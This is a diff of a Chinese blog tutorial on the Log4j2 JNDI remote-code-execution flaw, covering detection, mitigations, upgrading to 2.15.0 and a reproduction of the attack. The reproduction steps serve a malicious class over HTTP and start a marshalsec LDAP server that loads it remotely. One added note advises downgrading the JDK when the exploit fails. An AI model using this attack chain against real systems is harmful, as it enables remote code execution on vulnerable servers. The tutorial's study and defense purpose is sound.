@@ -25,7 +25,7 @@ comment: false
 
 2021年12月10日一觉醒来，发现程序员社交网站上全是`lo4j2`相关的内容。
 
-实际上2021年11月24日，阿里云安全团队已经向Apache官方团队报告了`Apache Log4j2`远程代码执行漏洞。之后陆续国内多家机构监测到`Apache Log4j2`存在任意代码执行的漏洞。2021年12月10日阿里云再次报告官方`2.15-rc1`版本存在漏洞绕后，建议升级`2.15.0`版本。网上出现了`Apache Log4j2`任意远程代码执行漏洞的攻击代码，仿佛一夜间大家才紧张起来，也有网友感叹“第一次感受到互联网的脆弱”。
+实际上2021年11月24日，阿里云安全团队已经向Apache官方团队报告了`Apache Log4j2`远程代码执行漏洞。之后陆续国内多家机构监测到`Apache Log4j2`存在任意代码执行的漏洞。2021年12月10日阿里云再次报告官方`2.15-rc1`版本存在漏洞绕过，建议升级`2.15.0`版本。网上出现了`Apache Log4j2`任意远程代码执行漏洞的攻击代码，仿佛一夜间大家才紧张起来，也有网友感叹“第一次感受到互联网的脆弱”。
 
 <h4 id="1.1">1.1 log4j日志简介</h4>
 
@@ -43,7 +43,7 @@ java有很多优秀的日志框架，并且设计是解耦的。接口层比如�
 </dependency>
 ```
 
-简单的配置文件`log4j.properties`demo如下：
+简单的配置文件`log4j.properties`的demo如下：
 
 ```shell
 #This is a log4j property
@@ -65,7 +65,7 @@ log4j.appender.STDOUT.layout.ConversionPattern=%5p [%t] (%F\:%L) - %m%n
 `log4j`存在漏洞的版本是`2.x <= 2.15-rc1`。查看对应的依赖是否存在有漏洞版本即可。具体方法：
 
 1. maven或者gradle构建项目，查看对应的配置文件，是否有相应的log4j依赖。
-2. 非第三方构建项目，找到项目的依赖`CLASSPAHT`，查看是否有相应的log4j依赖。
+2. 非第三方构建项目，找到项目的依赖`CLASSPAHT`，查看是否有相应的log4j相关jar（`log4j-api-***.jar`、`log4j-core-***.jar`）包依赖。
 3. 查看`CLASSPAHT`下是否有`log4j.properties`配置文件。
 
 > 查看`CLASSPAHT`的办法可以用`ps -ef |grep $PID`，查到对应的进程信息里面`-cp`参数值为`classpath`。对于springboot项目可以使用命令`mkdir xxx && cd xxx && jar xvf ../xx.jar`解压后找到`lib`目录查看。
@@ -80,6 +80,8 @@ log4j.appender.STDOUT.layout.ConversionPattern=%5p [%t] (%F\:%L) - %m%n
     - 可升级jdk版本至`6u211`、`7u201`、`8u191`、`11.0.1`以上，可以在一定程度上限制JNDI等漏洞利用方式。
     - 对于大于2.10版本的Log4j，可设置系统属性`log4j2.formatMsgNoLookups`或者环境变量`LOG4J_FORMAT_MSG_NO_LOOKUPS`为`true`。
     - 对于2.0-beta9 to 2.10.0的版本，可以删除对应的`JndiLookup`类：`zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`
+
+> 针对上面临时方案中的升级JDK版本，本代码示例在Windows `JDK 1.8.0_212-b10`也能够成功复现攻击，所以最好按照正式方案解决问题。
 
 <h3 id="2">2. 漏洞分析</h3>
 
@@ -114,7 +116,7 @@ log4j.appender.STDOUT.layout.ConversionPattern=%5p [%t] (%F\:%L) - %m%n
 
 2). 将`Log4jRCE.java`类本地编译生成的class文件，该class文件即为恶意远程class文件，将该class提供为http可访问服务。可以将java和class文件copy到一个目录中，在该目录中启动简单的python http server：
 
-> java文件实际上并不需要，这里copy java源文件是为了验证http远程可访问。
+> java源代码文件实际上并不需要，这里复制java源文件是为了验证http远程可访问。
 
 ```shell
 #进入class文件所在的目录执行
@@ -136,6 +138,8 @@ http访问java文件验证：
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://ip:port:8000/#Log4jRCE
 ```
 
+启动`LDAP`服务后，默认监听`1389`端口，如图：
+
 ![](/img/posts/log4j-ldap-service.png)
 
 4). 执行`log4j`的main方法，即可验证攻击完成：
@@ -147,6 +151,29 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://
 在Unix平台上运行，获取后台监听端口及进程，并将内容在运行目录生成`test.jpg`：
 
 ![](/img/posts/log4j-unix-get-listen-port-and-generate-pic.jpg)
+
+> 如果不能够成功复现攻击，报错`11:54:23.960 [main] ERROR log4j - Reference Class Name: foo`，可能是JDK版本过高。降低版本到`1.8.0_191`之下再尝试。
+
+<h4 id="3.2">3.2 防</h4>
+
+参考[1.3](#1.3)中的正式方案，将`log4j`版本升级到`2.15.0`，执行`log4j`的main方法不会再`jndi`远程加载class。
+
+```shell
+<dependency>
+    <groupId>org.apache.logging.log4j</groupId>
+    <artifactId>log4j-core</artifactId>
+    <version>2.15.0</version>
+</dependency>
+<dependency>
+    <groupId>org.apache.logging.log4j</groupId>
+    <artifactId>log4j-api</artifactId>
+    <version>2.15.0</version>
+</dependency>
+```
+
+> 如果是现场不方便重新打包，可将包下载，替换目标容器`lib`下对应的jar包。
+
+<h4 i="3.3">3.3 攻方"有道"</h4>
 
 <h3 id="4">4. 引用</h3>
 
